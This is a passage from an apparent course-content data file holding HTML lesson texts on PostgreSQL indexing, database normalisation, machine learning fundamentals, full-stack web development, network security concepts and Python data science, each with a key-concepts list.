<p><strong>Hash indexes</strong> store a hash of the indexed value — O(1) lookup for exact equality matches, but useless for range queries or sorting. In PostgreSQL, hash indexes are now WAL-logged (crash-safe), but B-Tree still outperforms them for most workloads. Use hash indexes only on very high-cardinality columns with pure equality lookups.</p>
<p><strong>GiST and SP-GiST indexes</strong> support geometric data, full-text search, and range types. PostGIS geographic queries require GiST indexes. Full-text search in PostgreSQL uses GiST or GIN indexes on tsvector columns.</p>
<p><strong>GIN (Generalised Inverted Index)</strong> is optimal for columns containing multiple values — arrays, JSONB fields, and full-text search. If you store tags as an array and want to find rows containing a specific tag, a GIN index on the array column is required for performance.</p>
<p><strong>BRIN (Block Range Index)</strong> stores min/max values for ranges of physically adjacent disk pages. Extremely small (a few kilobytes for a billion-row table) but only effective when the data is physically sorted by the indexed column — e.g. an append-only events table where newer rows always have higher timestamps. A BRIN index on a timestamp column in such a table can eliminate most block reads with negligible storage cost.</p>
<p><strong>Partial indexes</strong> — An index with a WHERE clause that only indexes a subset of rows: <code>CREATE INDEX ON orders(created_at) WHERE status = 'pending'</code>. Smaller, faster, and only used for queries with the same condition. Ideal when most queries focus on a specific subset (e.g. active records, unprocessed jobs).</p>
<p><strong>Functional indexes</strong> — Index the result of a function: <code>CREATE INDEX ON users (LOWER(email))</code>. Now queries with <code>WHERE LOWER(email) = ?</code> use the index. Essential for case-insensitive lookups without normalising data at write time.</p>

<h5 class="content-heading">Composite Indexes and Column Order</h5>
<p>A composite (multi-column) index on <code>(a, b, c)</code> can satisfy queries on <code>a</code>, on <code>(a, b)</code>, or on <code>(a, b, c)</code> — but NOT on <code>b</code> alone or <code>c</code> alone. This is the <strong>leftmost prefix rule</strong>. The index is sorted by <code>a</code> first, then <code>b</code> within each <code>a</code> value, then <code>c</code>. Without knowing the leading column, the database cannot use the sort order.</p>
<p>Column order in a composite index matters enormously. Put equality-filtered columns first (highest selectivity), then range-filtered columns, then columns only in ORDER BY. Example: for a query <code>WHERE user_id = ? AND status = 'active' ORDER BY created_at</code>, the optimal index is <code>(user_id, status, created_at)</code> — filters by user_id first (most selective equality), then status, then uses the index order for the sort, avoiding a sort operation entirely.</p>

<h5 class="content-heading">The Write Performance Trade-off</h5>
<p>Every index must be updated on every INSERT, UPDATE (of an indexed column), and DELETE. A table with 8 indexes requires 9 writes per row insert (1 heap + 8 index updates). On write-heavy tables, excessive indexes are a genuine performance problem. Index maintenance also causes index bloat over time (dead index entries from UPDATEs and DELETEs) — run <code>REINDEX</code> or <code>VACUUM</code> periodically.</p>
<p>Never add an index "just in case." Add indexes only when: you have a slow query you have identified with EXPLAIN ANALYZE, the query accesses a large table, and the WHERE/JOIN/ORDER BY columns are not already covered by an existing index.</p>

<h5 class="content-heading">Finding Missing Indexes in Production</h5>
<p>PostgreSQL's <code>pg_stat_user_tables</code> shows seq_scan counts — a table with many sequential scans and large row counts is a strong candidate for new indexes. Combined with <code>pg_stat_statements</code> for slow queries and EXPLAIN ANALYZE for query-specific analysis, you have all the tools needed to identify and fix missing indexes methodically.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>B-Tree index:</strong> Default balanced-tree index — efficient for equality, range, prefix, and ORDER BY. Traverses in O(log n) to find matching rows.</li>
<li><strong>Covering index:</strong> Contains all columns referenced by a query — enables index-only scans with no table access. The fastest possible read path.</li>
<li><strong>Composite index:</strong> Multi-column index obeying the leftmost prefix rule — only useful for queries that filter on leading columns.</li>
<li><strong>Partial index:</strong> Index with a WHERE clause — smaller and faster, ideal for queries targeting a specific subset of rows.</li>
<li><strong>Functional index:</strong> Index on the result of a function — enables index use on expressions like LOWER(email) in WHERE clauses.</li>
<li><strong>GIN index:</strong> Optimal for arrays, JSONB, and full-text search — indexes individual elements within multi-value columns.</li>
<li><strong>BRIN index:</strong> Tiny block-range index for naturally ordered data — extremely storage-efficient for append-only time-series tables.</li>
<li><strong>Leftmost prefix rule:</strong> A composite index on (a, b, c) helps queries on a, (a,b), or (a,b,c) but not b or c alone.</li>
<li><strong>Cardinality:</strong> Number of unique values in a column — high cardinality means each index entry points to few rows, making the index very selective and effective.</li>
<li><strong>Index bloat:</strong> Dead index entries from UPDATEs and DELETEs that inflate index size — mitigated by regular VACUUM / REINDEX.</li>
<li><strong>Write amplification:</strong> Each INSERT/UPDATE/DELETE must update all indexes on the table — over-indexing degrades write performance proportionally.</li>
<li><strong>pg_stat_user_tables:</strong> PostgreSQL system view showing sequential scan counts per table — high seq_scan on large tables indicates missing indexes.</li>
</ul>`,

  18: `<p><strong>Database normalisation</strong> is the art and science of designing relational schemas that are correct by construction — schemas where data redundancy is minimised, update anomalies are impossible, and the meaning of each piece of data is unambiguous. A poorly normalised schema is one where the same fact is stored in multiple places: when one copy is updated without the others, your database contains contradictory data. This is called an <strong>update anomaly</strong> and is a fundamental integrity failure.</p>
<p>The normal forms (1NF through BCNF and beyond) are a progressive series of rules, each eliminating a specific class of anomaly. Most real-world production databases target 3NF or BCNF. Understanding the theory behind each form lets you make informed decisions rather than just following rules mechanically.</p>

<h5 class="content-heading">Why Normalisation Matters — The Anomalies It Prevents</h5>
<p>Consider a denormalised <code>orders</code> table with columns: <code>order_id, customer_name, customer_email, product_name, product_price, quantity</code>. If customer Alice changes her email address, you must update every row with her name. If you miss one, your database now contains two different emails for Alice — which is correct? This is an <strong>update anomaly</strong>. If you delete the last order for a product, you lose the product's price history — this is a <strong>delete anomaly</strong>. You cannot store a new product without creating a fake order — this is an <strong>insert anomaly</strong>. Normalisation eliminates all three.</p>

<h5 class="content-heading">First Normal Form (1NF)</h5>
<p><strong>Rule</strong>: Every column must hold atomic (indivisible) values. No repeating groups. Each row must be uniquely identifiable (have a primary key).</p>
<p><strong>Violation</strong>: A <code>phone_numbers</code> column containing "555-1234, 555-5678" (multiple values in one cell). Or a table with columns <code>tag1, tag2, tag3</code> (repeating groups).</p>
<p><strong>Fix</strong>: Create a separate <code>phone_numbers</code> table with a foreign key back to the parent. Each phone number gets its own row. 1NF is the foundational requirement — tables violating 1NF cannot be queried efficiently in standard SQL.</p>

<h5 class="content-heading">Second Normal Form (2NF)</h5>
<p><strong>Rule</strong>: Must be in 1NF, and every non-key attribute must depend on the <em>entire</em> primary key (no partial dependency). Only relevant for tables with composite primary keys.</p>
<p><strong>Violation</strong>: An <code>order_items</code> table with primary key <code>(order_id, product_id)</code> that also stores <code>product_name</code> and <code>product_category</code>. These columns depend only on <code>product_id</code>, not on the full composite key. If the product's name changes, you must update every order_items row — an update anomaly.</p>
<p><strong>Fix</strong>: Move <code>product_name</code> and <code>product_category</code> to a separate <code>products</code> table keyed by <code>product_id</code>. The <code>order_items</code> table keeps only <code>order_id</code>, <code>product_id</code>, <code>quantity</code>, and the price at time of purchase (a deliberate denormalisation — historical prices should not change when the product price changes).</p>

<h5 class="content-heading">Third Normal Form (3NF)</h5>
<p><strong>Rule</strong>: Must be in 2NF, and no non-key attribute may depend on another non-key attribute (no transitive dependency).</p>
<p><strong>Violation</strong>: A <code>users</code> table with <code>user_id, zip_code, city, state</code>. The city and state depend on the zip_code, not directly on the user_id. If zip code 94102 is always San Francisco, CA, and you change the city in one row without others, you create inconsistency.</p>
<p><strong>Fix</strong>: Create a <code>zip_codes</code> table with <code>zip_code, city, state</code>. The users table keeps only <code>zip_code</code> as a foreign key. Now city and state are stored exactly once — updating it is a single-row change. This is Codd's original definition of "the key, the whole key, and nothing but the key."</p>

<h5 class="content-heading">Boyce-Codd Normal Form (BCNF)</h5>
<p>BCNF is a slightly stronger version of 3NF. A table is in BCNF if, for every functional dependency X → Y, X is a superkey (a key or superset of a key). BCNF violations are rare in practice but occur in tables with multiple overlapping candidate keys. Most schemas in 3NF are also in BCNF.</p>

<h5 class="content-heading">When to Denormalise — The Performance Trade-off</h5>
<p>Normalisation is correct for data integrity, but joins have a cost. In read-heavy systems (reporting dashboards, analytics, product catalogues) where data changes infrequently, strategic denormalisation can dramatically improve query performance by eliminating expensive joins.</p>
<p><strong>Precomputed aggregates</strong>: Storing <code>order_count</code> and <code>total_spend</code> on the users table avoids a GROUP BY join on every page load. The trade-off: this column must be updated every time an order is created, modified, or deleted. Use database triggers or application-level logic consistently — a missed update creates inconsistency.</p>
<p><strong>Materialised views</strong>: A better alternative to manual denormalisation. A materialised view pre-computes and stores the result of a complex query. In PostgreSQL: <code>CREATE MATERIALIZED VIEW monthly_revenue AS SELECT ... FROM orders GROUP BY ...;</code>. Refresh with <code>REFRESH MATERIALIZED VIEW monthly_revenue;</code> — either on a schedule or triggered by changes. Unlike a manual denormalised column, the source of truth remains normalised; the materialised view is just a cache that can be fully rebuilt.</p>
<p><strong>Document stores for read models</strong>: In event-sourced and CQRS architectures, the "read model" (what users query) is deliberately denormalised into a document structure (JSON) for fast reads, while the "write model" (events) remains normalised. This is a deliberate architectural trade-off for systems with extreme read/write asymmetry.</p>

<h5 class="content-heading">Referential Integrity and Foreign Keys</h5>
<p>Foreign key constraints enforce that a referencing column always points to a valid row in the referenced table. Without them, you can have "orphaned" records — order items with no parent order, comments with no parent post. Always define foreign key constraints unless you have a specific performance reason not to (FK checks have a small overhead on INSERT/UPDATE/DELETE).</p>
<p>ON DELETE actions: <strong>RESTRICT</strong> (default — prevents deletion of parent if children exist), <strong>CASCADE</strong> (deletes children automatically — use carefully), <strong>SET NULL</strong> (nulls out the foreign key — requires the column to be nullable), <strong>SET DEFAULT</strong> (sets foreign key to its default value). Choose based on your business logic: deleting a user probably cascades to their sessions but restricts if they have financial records.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Normalisation:</strong> Organising a schema to eliminate data redundancy and prevent update, insert, and delete anomalies.</li>
<li><strong>Update anomaly:</strong> When the same fact is stored multiple times and one copy gets updated without the others — produces contradictory data.</li>
<li><strong>1NF:</strong> Atomic column values, no repeating groups, unique rows. The foundational requirement for all relational tables.</li>
<li><strong>2NF:</strong> No partial dependencies — non-key attributes must depend on the whole composite key, not just part of it.</li>
<li><strong>3NF:</strong> No transitive dependencies — non-key attributes depend only on the primary key, not on other non-key attributes. "The key, the whole key, nothing but the key."</li>
<li><strong>BCNF:</strong> Stronger 3NF — every determinant in a functional dependency must be a superkey. Rarely violated in typical OLTP schemas.</li>
<li><strong>Foreign key:</strong> Column referencing another table's primary key — enforces referential integrity, preventing orphaned records.</li>
<li><strong>Referential integrity:</strong> The guarantee that all foreign key values point to valid existing rows — enforced by FK constraints at the database level.</li>
<li><strong>Denormalisation:</strong> Intentional redundancy for read performance — precomputed aggregates, duplicated columns to avoid joins. Introduces consistency risk; use materialised views instead where possible.</li>
<li><strong>Materialised view:</strong> Pre-computed stored query result — provides denormalisation's read performance with the source data remaining normalised. Refreshed on schedule or on demand.</li>
<li><strong>ON DELETE CASCADE:</strong> Automatically deletes child rows when the parent is deleted — use carefully, as it can trigger large cascading deletes.</li>
</ul>`,

  // ── Course 4: Machine Learning Fundamentals ───────────────────────────
  19: `<p>Machine learning is a branch of artificial intelligence where systems learn patterns from data rather than following explicit rules. Instead of programming every decision, you show the algorithm thousands of examples and it learns the underlying pattern. This approach has revolutionised image recognition, language translation, fraud detection, and medical diagnosis.</p>
<p>The three main types of learning are supervised (you provide labelled examples), unsupervised (the algorithm finds hidden patterns without labels), and reinforcement (an agent learns by receiving rewards and penalties). Choosing the right type depends on what data you have and what problem you are solving.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Supervised learning:</strong> Training on labelled examples to predict an output (e.g. spam or not spam).</li>
<li><strong>Unsupervised learning:</strong> Finding hidden structure in unlabelled data (e.g. customer segments).</li>
<li><strong>Training set:</strong> The data used to fit the model's parameters.</li>
<li><strong>Test set:</strong> Held-out data used to evaluate how well the model generalises to unseen examples.</li>
</ul>`,

  20: `<p>Real-world data is messy — missing values, inconsistent formats, outliers, and incorrect entries are the norm. Data preprocessing transforms raw data into a clean format that machine learning algorithms can learn from effectively. Studies consistently show that 80% of a data scientist's time is spent cleaning and preparing data.</p>
<p>Feature scaling ensures that no single feature dominates the model simply because it has a larger numerical range. Standardisation (zero mean, unit variance) and min-max normalisation are the two main approaches. Encoding categorical variables (like "red", "blue", "green") into numbers is also essential since most ML algorithms require numerical input.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Imputation:</strong> Filling in missing values using the mean, median, or a predicted value.</li>
<li><strong>Standardisation:</strong> Scaling features to have zero mean and unit variance (Z-score scaling).</li>
<li><strong>One-hot encoding:</strong> Converting a categorical variable into binary columns (one per category).</li>
<li><strong>Data leakage:</strong> Accidentally using future or target information during training — inflates performance metrics.</li>
</ul>`,

  21: `<p>Linear regression predicts a continuous numerical output by fitting a straight line (or hyperplane in multiple dimensions) through the training data. The algorithm minimises the Mean Squared Error between predicted and actual values by adjusting the model's weights using gradient descent — an iterative process of taking small steps in the direction that reduces error.</p>
<p>Regularisation (Ridge/L2 and Lasso/L1) adds a penalty term to the loss function to prevent the model from fitting noise in the training data. Ridge shrinks all weights towards zero; Lasso can shrink some weights all the way to zero, effectively performing feature selection. Both help the model generalise better to new data.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Gradient descent:</strong> An optimisation algorithm that iteratively moves weights in the direction of steepest loss reduction.</li>
<li><strong>MSE (Mean Squared Error):</strong> The average squared difference between predictions and actual values.</li>
<li><strong>R² score:</strong> Proportion of variance in the target explained by the model; 1.0 is perfect, 0 is no better than the mean.</li>
<li><strong>Ridge / Lasso:</strong> Regularisation techniques that penalise large weights to reduce overfitting.</li>
</ul>`,

  22: `<p>Classification predicts which category a data point belongs to. Logistic regression (despite the name) is a classification algorithm that outputs probabilities between 0 and 1. Decision trees split data on the feature that best separates classes at each node, creating an interpretable flowchart of decisions that is easy to visualise and explain.</p>
<p>Support Vector Machines (SVMs) find the hyperplane that maximises the margin between classes — the widest possible gap between the nearest data points on each side. K-Nearest Neighbours (k-NN) classifies a new point by majority vote of its k closest neighbours in the training set. Both are effective for different types of data distributions.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Decision boundary:</strong> The line or surface the model uses to separate different classes.</li>
<li><strong>Precision:</strong> Of all predicted positives, how many were actually positive?</li>
<li><strong>Recall:</strong> Of all actual positives, how many did the model correctly identify?</li>
<li><strong>F1-score:</strong> The harmonic mean of precision and recall — useful when classes are imbalanced.</li>
</ul>`,

  23: `<p>Ensemble methods combine predictions from multiple models to produce a result better than any single model. The intuition is similar to asking a crowd of experts — their collective judgment tends to be more accurate and more robust than relying on any one person. Bagging reduces variance by training multiple models on random subsets of data; boosting reduces bias by training each model to correct the errors of the previous one.</p>
<p>Random Forest trains many decision trees on random subsets of features and data, then averages their predictions. Gradient Boosting (and its optimised variants XGBoost, LightGBM) builds trees sequentially, each one fitting the residual errors of the previous ensemble. Gradient boosting consistently wins structured-data competitions on Kaggle.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Bagging:</strong> Training models on bootstrapped (random with replacement) subsets — reduces variance.</li>
<li><strong>Boosting:</strong> Sequential training where each model focuses on correcting the previous model's errors.</li>
<li><strong>Random Forest:</strong> An ensemble of decision trees with random feature selection at each split.</li>
<li><strong>XGBoost:</strong> An optimised gradient boosting library known for speed and accuracy on tabular data.</li>
</ul>`,

  24: `<p>A neural network is a system of interconnected nodes (neurons) organised in layers. The input layer receives features; hidden layers learn increasingly abstract representations; the output layer produces predictions. Each connection has a weight — training adjusts these weights using backpropagation to minimise prediction error across thousands of examples.</p>
<p>Activation functions (ReLU, sigmoid, softmax) introduce non-linearity, allowing networks to learn complex patterns that linear models cannot. Deep learning refers to networks with many hidden layers. Without regularisation techniques like dropout and early stopping, deep networks easily memorise training data and fail to generalise — this is overfitting.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Backpropagation:</strong> Computing gradients layer by layer to update weights and reduce loss.</li>
<li><strong>ReLU:</strong> Rectified Linear Unit activation — outputs zero for negative inputs, the input itself otherwise.</li>
<li><strong>Epoch:</strong> One complete pass through the entire training dataset.</li>
<li><strong>Dropout:</strong> Randomly disabling neurons during training to prevent co-adaptation and overfitting.</li>
</ul>`,

  // ── Course 5: Full Stack Web Development ─────────────────────────────
  25: `<p>HTML5 is the markup language that structures every web page. Semantic elements like <code>&lt;header&gt;</code>, <code>&lt;nav&gt;</code>, <code>&lt;main&gt;</code>, <code>&lt;article&gt;</code>, and <code>&lt;footer&gt;</code> describe the meaning of content rather than just its appearance. This benefits accessibility tools (screen readers) and search engines that parse your page structure to understand its content.</p>
<p>Web accessibility means building sites that work for everyone, including users with disabilities. Using proper heading hierarchy (<code>h1</code> to <code>h6</code>), alt text on images, labels on form fields, and sufficient colour contrast are foundational requirements. The WCAG 2.1 guidelines provide the international standard for accessible web content.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Semantic HTML:</strong> Using tags that convey meaning (<code>&lt;nav&gt;</code>, <code>&lt;article&gt;</code>) rather than generic <code>&lt;div&gt;</code> tags.</li>
<li><strong>ARIA attributes:</strong> Provide accessibility information to assistive technologies when HTML semantics are not enough.</li>
<li><strong>Viewport meta tag:</strong> <code>&lt;meta name="viewport"&gt;</code> ensures correct rendering on mobile devices.</li>
<li><strong>LocalStorage API:</strong> Stores key-value pairs in the browser that persist across sessions.</li>
</ul>`,

  26: `<p>CSS Flexbox and Grid are the two modern layout systems. Flexbox excels at one-dimensional layouts — aligning items in a row or column. Grid handles two-dimensional layouts — rows and columns simultaneously. Together they replace the old float-based and table-based layouts that were fragile and hard to maintain.</p>
<p>Responsive design means your layout adapts gracefully to any screen size — from a 320px phone to a 4K monitor. Mobile-first design starts with the smallest screen styles and uses <code>min-width</code> media queries to add complexity for larger screens. CSS custom properties (variables) make maintaining a consistent design system across a large codebase much easier.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Flexbox:</strong> One-dimensional layout; use for rows or columns of items.</li>
<li><strong>CSS Grid:</strong> Two-dimensional layout; use for full page layouts and complex component grids.</li>
<li><strong>Media query:</strong> Applies CSS rules conditionally based on screen width, height, or device type.</li>
<li><strong>CSS variables:</strong> <code>--primary-color: #3d6b1e</code> — reusable values that make global changes easy.</li>
</ul>`,

  27: `<p>JavaScript is the only programming language that runs natively in the browser, making it essential for any web developer. Understanding the event loop is critical: JavaScript is single-threaded, so asynchronous operations (fetching data, reading files) use callbacks, Promises, or async/await to avoid blocking the UI while waiting.</p>
<p>ES6+ introduced features that transformed how JavaScript is written: arrow functions, destructuring, template literals, modules, spread/rest operators, and async/await. Closures — functions that remember the scope they were created in — are the foundation of many JavaScript patterns including event handlers, factory functions, and module patterns.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Event loop:</strong> How JavaScript handles async operations without blocking — the call stack, task queue, and microtask queue.</li>
<li><strong>Closure:</strong> A function that captures and remembers variables from its surrounding scope.</li>
<li><strong>Promise:</strong> An object representing a value that will be available in the future (pending, fulfilled, or rejected).</li>
<li><strong>async/await:</strong> Syntactic sugar over Promises that makes asynchronous code look and behave like synchronous code.</li>
</ul>`,

  28: `<p>Node.js lets you run JavaScript on the server, using the same language for both front and back end. Express.js is a minimal web framework that provides routing and middleware on top of Node's HTTP module. Middleware functions are the backbone of Express — they intercept requests, process them (logging, parsing, authentication), and pass them to the next handler.</p>
<p>REST API design uses HTTP methods and status codes semantically: GET retrieves, POST creates, PUT/PATCH updates, DELETE removes. A well-designed API is predictable and consistent — resources are nouns in the URL path, verbs live in the HTTP method, and responses use standard status codes (200, 201, 400, 401, 404, 500).</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Middleware:</strong> A function that receives (req, res, next) and can modify the request, send a response, or call next().</li>
<li><strong>Route handler:</strong> A function mapped to a specific HTTP method and URL path.</li>
<li><strong>Environment variables:</strong> Configuration values (DB credentials, API keys) stored outside the codebase in .env files.</li>
<li><strong>Express Router:</strong> Organises routes into separate files for a cleaner, modular project structure.</li>
</ul>`,

  29: `<p>MySQL is a relational database that stores data in tables with rows and columns. The <code>mysql2</code> npm package provides a Promise-based connection pool — a pool keeps several connections open and reuses them, avoiding the overhead of opening a new connection for every request. Always use parameterised queries to prevent SQL injection.</p>
<p>JWT (JSON Web Token) is a compact, self-contained token for transmitting authentication data. After login, the server signs a token containing the user's ID and role using a secret key. The client stores this token and sends it with every subsequent request. The server verifies the signature — no database lookup needed — making JWTs stateless and scalable.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Connection pool:</strong> A cache of reusable database connections — avoids the overhead of new connections per request.</li>
<li><strong>bcrypt:</strong> A slow, salt-generating password hashing function designed to be resistant to brute-force attacks.</li>
<li><strong>JWT:</strong> Three base64-encoded parts: header (algorithm), payload (claims), signature (verification).</li>
<li><strong>Auth middleware:</strong> Verifies the JWT on protected routes before the handler function runs.</li>
</ul>`,

  30: `<p>React is a JavaScript library for building user interfaces from reusable components. Each component is a function that takes props (input data) and returns JSX (HTML-like syntax that compiles to JavaScript). When state changes, React efficiently re-renders only the affected parts of the DOM using its virtual DOM diffing algorithm.</p>
<p>Deployment is the process of making your application accessible on the internet. Services like Railway, Render, and Vercel connect to your GitHub repository and automatically build and deploy on every push. Environment variables on the hosting platform replace your local .env file, keeping secrets out of version control.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Component:</strong> A reusable, self-contained piece of UI — a function that returns JSX.</li>
<li><strong>Props:</strong> Read-only data passed from a parent component to a child.</li>
<li><strong>Virtual DOM:</strong> React's in-memory representation of the UI — used to calculate the minimum DOM updates needed.</li>
<li><strong>CI/CD:</strong> Continuous Integration / Continuous Deployment — automatically test and deploy on every code push.</li>
</ul>`,

  // ── Course 6: Network Security Essentials ────────────────────────────
  31: `<p>The OSI model divides network communication into 7 abstract layers, from physical cables (Layer 1) up to application protocols like HTTP (Layer 7). Understanding which layer a security control operates at helps you choose the right tool — a firewall operates at Layer 3/4, TLS at Layer 4/5, and a WAF at Layer 7. The TCP/IP model is a practical 4-layer version used in the real internet.</p>
<p>Wireshark is the industry-standard packet analyser. It captures raw network traffic and lets you inspect every packet at every layer. Mastering Wireshark is essential for network troubleshooting, security analysis, and understanding exactly how protocols work in practice.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>OSI model:</strong> 7-layer conceptual framework for network communication (Physical → Application).</li>
<li><strong>TCP/IP:</strong> The actual protocol suite the internet runs on, with 4 layers.</li>
<li><strong>Packet:</strong> A unit of data transmitted over a network, containing a header (addressing) and payload (content).</li>
<li><strong>Port:</strong> A number (0–65535) that identifies a specific process or service on a host.</li>
</ul>`,

  32: `<p>A firewall inspects network traffic and enforces rules about what is allowed and what is blocked. Stateless packet filters examine individual packets in isolation based on source IP, destination IP, and port. Stateful firewalls track the state of connections — they know whether a packet is part of an established TCP session, enabling smarter filtering decisions.</p>
<p>A DMZ (Demilitarised Zone) is a network segment that sits between the public internet and the internal private network. Public-facing servers (web, email) live in the DMZ — they are accessible to the internet but isolated from the sensitive internal network. This limits the damage if a public server is compromised.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Stateful inspection:</strong> Tracks TCP connection state to allow only legitimate response packets.</li>
<li><strong>ACL (Access Control List):</strong> An ordered list of rules specifying which traffic to permit or deny.</li>
<li><strong>NAT (Network Address Translation):</strong> Maps private internal IPs to a public IP, hiding internal structure.</li>
<li><strong>DMZ:</strong> A network zone between internet and internal network hosting public-facing services.</li>
</ul>`,

  33: `<p>A VPN (Virtual Private Network) creates an encrypted tunnel over the public internet, allowing remote users or offices to communicate as if they were on the same private network. This protects data from eavesdropping on untrusted networks (public Wi-Fi) and allows secure remote access to corporate resources.</p>
<p>WireGuard is a modern VPN protocol praised for its simplicity (around 4,000 lines of code vs 400,000 for OpenVPN), performance, and strong cryptography. IPSec is the traditional enterprise standard, commonly used for site-to-site VPNs between office locations. Split tunnelling allows only specific traffic to go through the VPN while the rest uses the regular internet connection.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Site-to-site VPN:</strong> Connects two entire networks (e.g. two office locations) through an encrypted tunnel.</li>
<li><strong>Remote access VPN:</strong> Connects an individual user's device to a private network over the internet.</li>
<li><strong>IPSec:</strong> A suite of protocols for authenticating and encrypting IP packets at the network layer.</li>
<li><strong>Split tunnelling:</strong> Routes only specific traffic through the VPN — reduces load and improves performance.</li>
</ul>`,

  34: `<p>An Intrusion Detection System (IDS) monitors network traffic or host activity for suspicious patterns and generates alerts. An Intrusion Prevention System (IPS) goes further — it can automatically block malicious traffic in real time. Signature-based detection matches known attack patterns; anomaly-based detection flags traffic that deviates from a learned baseline of normal behaviour.</p>
<p>A SIEM (Security Information and Event Management) platform aggregates logs from firewalls, IDS, servers, and applications into a central system where security teams can search, correlate, and alert on events across the entire infrastructure. SIEMs are the heart of a modern Security Operations Centre (SOC).</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Signature-based detection:</strong> Matches traffic against a library of known attack patterns — fast but blind to new attacks.</li>
<li><strong>Anomaly-based detection:</strong> Flags deviations from a normal baseline — catches new attacks but prone to false positives.</li>
<li><strong>False positive:</strong> A legitimate activity incorrectly flagged as malicious — too many cause alert fatigue.</li>
<li><strong>SIEM:</strong> Centralises and correlates security logs across the entire infrastructure for threat hunting and incident response.</li>
</ul>`,

  35: `<p>Wi-Fi security has evolved from the broken WEP protocol (cracked in minutes) through WPA2 (still widely used) to WPA3 (current standard). WPA2 with a strong passphrase remains secure, but WPA2-Enterprise using 802.1X authentication is significantly stronger for corporate networks. Common Wi-Fi attacks include evil twin access points, deauthentication floods, and the KRACK attack on WPA2's four-way handshake.</p>
<p>DNS (Domain Name System) translates human-readable domain names into IP addresses. DNS Spoofing (or Cache Poisoning) tricks a resolver into caching a false DNS record, redirecting users to malicious servers. DNSSEC adds digital signatures to DNS records so resolvers can verify they have not been tampered with. DNS-over-HTTPS (DoH) encrypts DNS queries to prevent eavesdropping.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>WPA3:</strong> The current Wi-Fi security standard — uses SAE (Simultaneous Authentication of Equals) replacing WPA2's PSK.</li>
<li><strong>Evil twin attack:</strong> A rogue access point with the same SSID as a legitimate network to intercept traffic.</li>
<li><strong>DNSSEC:</strong> Adds cryptographic signatures to DNS records to verify their authenticity.</li>
<li><strong>DNS-over-HTTPS (DoH):</strong> Encrypts DNS queries inside HTTPS to prevent snooping by ISPs or attackers.</li>
</ul>`,

  // ── Course 7: Python for Data Science ────────────────────────────────
  36: `<p>Python has become the dominant language for data science due to its readable syntax, vast ecosystem of libraries, and the fact that it bridges the gap between quick scripting and production-grade software. Setting up a virtual environment (venv or conda) for each project isolates its dependencies and prevents version conflicts between projects on the same machine.</p>
<p>Python's built-in data structures — lists, dictionaries, sets, and tuples — are the building blocks for all data manipulation. List comprehensions provide a concise, Pythonic way to transform and filter collections. Lambda functions create small, anonymous functions inline — useful for passing simple logic to sort() or filter() without defining a named function.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Virtual environment:</strong> An isolated Python installation for a project — keeps dependencies separate.</li>
<li><strong>List comprehension:</strong> <code>[x*2 for x in range(10) if x % 2 == 0]</code> — concise, readable list creation.</li>
<li><strong>Dictionary:</strong> A key-value mapping; O(1) average lookup time — essential for data aggregation.</li>
<li><strong>Lambda:</strong> An anonymous function — <code>lambda x: x ** 2</code> is equivalent to <code>def f(x): return x ** 2</code>.</li>
</ul>`,

  37: `<p>NumPy (Numerical Python) provides the ndarray — a fast, memory-efficient multi-dimensional array. NumPy operations are implemented in C and execute far faster than equivalent Python loops. Broadcasting allows NumPy to perform operations on arrays of different shapes without explicit loops — adding a scalar to every element, or adding a row vector to every row of a matrix.</p>
<p>Vectorisation replaces slow Python for-loops with array operations that run in C underneath. A loop that processes one million numbers in pure Python might take seconds; the equivalent NumPy vectorised operation completes in milliseconds. This performance difference is why NumPy is the foundation of virtually every Python data science library.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>ndarray:</strong> NumPy's N-dimensional array — stores elements of a single data type contiguously in memory.</li>
<li><strong>Broadcasting:</strong> Automatically expands smaller arrays to match larger ones during arithmetic operations.</li>
<li><strong>Vectorisation:</strong> Replacing Python loops with array operations — dramatically faster due to C implementation.</li>
<li><strong>np.linalg:</strong> NumPy's linear algebra module — provides matrix multiplication, determinants, and eigenvalues.</li>
</ul>`,

  38: `<p>Pandas is built on NumPy and provides two key data structures: Series (one-dimensional) and DataFrame (two-dimensional, like a spreadsheet). DataFrames can load data from CSV, Excel, SQL, JSON, and many other formats. The ability to select, filter, group, and merge data with concise syntax makes Pandas the indispensable tool for tabular data manipulation in Python.</p>
<p>GroupBy splits a DataFrame into groups based on a column's values, applies a function to each group (sum, mean, count, custom aggregations), and combines the results. Merging DataFrames works just like SQL JOINs — inner, left, right, and outer merges are all supported. The <code>apply()</code> function lets you run a custom function on each row or column.</p>
<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>DataFrame:</strong> A 2D labelled data structure with columns of potentially different types.</li>
<li><strong>groupby():</strong> Split-apply-combine — group rows, apply an aggregation, combine results into a new DataFrame.</li>
<li><strong>merge():</strong> Combines two DataFrames based on common columns — equivalent to a SQL JOIN.</li>
<li><strong>NaN:</strong> "Not a Number" — Pandas' representation of missing values; use <code>dropna()</code> or <code>fillna()</code> to handle them.</li>
</ul>`,

